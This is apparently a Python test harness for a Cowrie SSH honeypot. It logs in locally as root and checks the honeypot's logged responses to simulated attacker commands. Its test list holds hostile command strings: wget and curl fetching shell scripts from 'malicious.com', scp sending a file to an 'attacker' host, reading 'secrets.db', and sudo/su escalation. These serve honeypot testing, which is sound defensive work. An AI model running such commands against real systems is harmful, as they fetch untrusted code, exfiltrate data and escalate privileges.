import pexpect
import sys
import time
import os
import json

LOG_FILE = "var/log/cowrie/cowrie.json"

def get_tty_log_for_session(session_id):
    try:
        # Scan log file for 'cowrie.log.closed' event with matching session
        # We read from end is better but for now just read all or last 1000 lines
        with open(LOG_FILE, 'r') as f:
            lines = f.readlines()
            
        for line in reversed(lines):
            try:
                data = json.loads(line)
                if data.get("eventid") == "cowrie.log.closed" and data.get("session") == session_id:
                    return data.get("ttylog")
            except:
                pass
        return None
    except Exception as e:
        print(f"Error finding log for session {session_id}: {e}")
        return None

def get_latest_session_id():
    try:
        with open(LOG_FILE, 'r') as f:
            lines = f.readlines()
        for line in reversed(lines):
             try:
                 data = json.loads(line)
                 if data.get("eventid") == "cowrie.session.connect": # Or command input?
                     # We want the session we JUST created.
                     return data.get("session")
             except:
                 pass
    except:
        pass
    return None

def check_tty_log_for_strings(log_path, expected_substrings):
    try:
        if not os.path.exists(log_path):
            print(f"Log path does not exist: {log_path}")
            return False
            
        with open(log_path, 'rb') as f:
            content = f.read().decode('utf-8', errors='ignore')
            
        found = False
        for es in expected_substrings:
            if es in content:
                found = True
                print(f"[MATCH] Found '{es}' in TTY log.")
                return True
        
        if not found:
             print(f"[WARNING] Did not find any expected strings in {log_path}. Content snippet: {content[:200]}...")
             return False
    except Exception as e:
        print(f"Error reading TTY log: {e}")
        return False

def run_test(command, expected_substrings, test_name):
    print(f"\n[{test_name}] Testing '{command}'...")
    try:
        # We need to capture the session ID to verify the correct log
        # pexpect doesn't give us the session ID directly.
        # But we can look at the latest session in JSON log after keeping it open.
        
        # Mark current position in log file? 
        # Or just get latest session ID after connect.
        
        initial_session = get_latest_session_id()
        
        child = pexpect.spawn('ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -p 2222 root@127.0.0.1')
        index = child.expect(['password:', pexpect.EOF, pexpect.TIMEOUT], timeout=10)
        
        # Wait a sec for the log to update with session connect
        time.sleep(1)
        current_session = get_latest_session_id()
        
        if index != 0:
            print("Failed to get password prompt")
            child.close()
            return

        child.sendline('root')
        child.expect(['#', '$'], timeout=10)
        
        child.sendline(command)
        try:
            child.expect(['#', '$', pexpect.EOF], timeout=5)
        except:
            pass
        child.close()
        time.sleep(1) # Allow log flush
        
        if not current_session:
            print("Could not identify session ID.")
            return

        print(f"Session ID: {current_session}")
        ttylog = get_tty_log_for_session(current_session)
        
        if ttylog:
            print(f"Checking log: {ttylog}")
            # Fix relative path if needed
            if not ttylog.startswith("/"):
                ttylog = os.path.join(os.getcwd(), ttylog)
            check_tty_log_for_strings(ttylog, expected_substrings)
        else:
            print("No TTY log found for this session.")
        
    except Exception as e:
        print(f"Error: {e}")

def verify_responses():
    print("Starting verification via TTY Logs (JSON Correlation)...")
    
    tests = [
        ("cat secrets.db", ["Binary data output", "AWS_ACCESS_KEY", "root_password", "No such file"], "CAT"),
        ("wget http://malicious.com/shell.sh", ["Saving to: shell.sh", "backdoor.sh", "internal_backup.sh", "unable to resolve"], "WGET"),
        ("curl http://malicious.com/test.sh", ["Hello World", "reverse shell", "Production Server", "Could not resolve"], "CURL"),
        ("sudo su", ["[sudo] password", "unable to resolve", "root@server", "try again"], "SUDO"),
        ("chmod 777 shell.sh", ["Permission updated", "system binary modified", "Operation not permitted"], "CHMOD"),
        ("su", ["Password:", "Authentication failure", "root@server"], "SU"),
        ("scp file.txt attacker@1.2.3.4:/tmp", ["100%", "Transfer complete", "external transfer", "connection closed"], "SCP"),
        ("ssh attacker@192.168.1.10", ["Connecting to", "Connected to", "Security monitoring", "Connection refused"], "SSH")
    ]
    
    for cmd, expected, name in tests:
        run_test(cmd, expected, name)
        time.sleep(1)

    print("\nVerification Complete.")

if __name__ == "__main__":
    verify_responses()
